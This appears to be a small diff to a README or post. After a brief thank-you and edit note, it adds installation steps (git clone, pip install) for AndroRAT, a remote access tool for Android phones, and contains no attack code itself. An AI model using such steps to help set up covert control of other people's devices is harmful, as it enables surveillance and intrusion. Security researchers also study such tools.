@@ -4,3 +4,20 @@ Thank  you...🙏
 
 
 Edit: So, yeah, I managed to do it. Now, if you have any suggestions, always tell me. I'll be happy to make changes
+
+
+#Installation
+git clone https://github.com/karma9874/AndroRAT.git
+cd AndroRAT
+pip install -r requirements.txt
+
+
+    
+      
+    
+
+      
+    
+
+    
+  
